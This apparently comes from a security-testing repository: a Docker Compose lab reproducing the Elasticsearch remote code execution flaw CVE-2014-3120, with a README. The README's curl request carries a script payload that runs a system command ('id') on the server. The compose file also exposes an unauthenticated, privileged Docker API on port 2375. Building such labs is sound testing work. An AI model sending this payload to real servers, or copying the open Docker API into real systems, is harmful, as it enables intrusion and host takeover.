{
    "files": [
        {
            "location": "./../../dockers/CVE-2014-3120/custom_no_tool/docker-compose.yml",
            "content": "version: \"3.9\"\nservices:\n  vulnerable-docker:\n    image: docker:20.10-dind\n    privileged: true\n    environment:\n      DOCKER_TLS_CERTDIR: \"\"\n    command: [\"dockerd\", \"--storage-driver=vfs\", \"-H\", \"tcp://0.0.0.0:2375\", \"-H\", \"unix:///var/run/docker.sock\"]\n    ports:\n      - \"2375:2375\"\n    volumes:\n      - docker-data:/var/lib/docker\n    healthcheck:\n      test: [\"CMD-SHELL\", \"nc -z localhost 2375 || exit 1\"]\n      interval: 5s\n      timeout: 2s\n      retries: 12\n\n  elasticsearch:\n    image: docker.elastic.co/elasticsearch/elasticsearch:1.1.1\n    environment:\n      - discovery.type=single-node\n    ports:\n      - \"9200:9200\"\n    volumes:\n      - es-data:/usr/share/elasticsearch/data\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n    healthcheck:\n      test: [\"CMD-SHELL\", \"curl -f http://127.0.0.1:9200 || exit 1\"]\n      interval: 10s\n      timeout: 5s\n      retries: 6\n\nvolumes:\n  docker-data:\n    driver: local\n  es-data:\n    driver: local"
        },
        {
            "location": "./../../dockers/CVE-2014-3120/custom_no_tool/README.md",
            "content": "# Vulnerable Docker Setup for CVE-2014-3120\n\nThis repository provides a Docker Compose environment that reproduces the conditions needed to exploit CVE\u20112014\u20113120, an Elasticsearch remote code execution vulnerability present in versions 1.1.1 and 1.2.0.\n\n## Services\n\n- **elasticsearch** \u2013 Elasticsearch 1.1.1 (from `docker.elastic.co`) running in single\u2011node mode, exposing HTTP port 9200.\n- **vulnerable-docker** \u2013 (optional) Docker\u2011in\u2011Docker instance exposing the Docker remote API on port 2375. This service is retained for completeness but is not required for the Elasticsearch exploit.\n\n## Deploy\n\n```bash\ncd ./../../dockers/CVE-2014-3120/custom_no_tool\ndocker compose up -d\n```\n\nElasticsearch will be reachable at `http://localhost:9200`. You can test the vulnerable scripting endpoint, for example:\n\n```bash\ncurl -XGET 'http://localhost:9200/_search' -H 'Content-Type: application/json' -d '{\"script_fields\": {\"test\": {\"script\": \"java.lang.Runtime.getRuntime().exec(\\\"id\\\").getText()\"}}}'\n```\n\n## Note\n\nThe setup uses an old Elasticsearch image that is intentionally vulnerable. **Do not run this configuration in any production or trusted environment.**"
        },
        {
            "location": "./../../dockers/CVE-2014-3120/custom_no_tool/.dockerignore",
            "content": ""
        }
    ],
    "directory_tree": "CVE-2014-3120/custom_no_tool"
}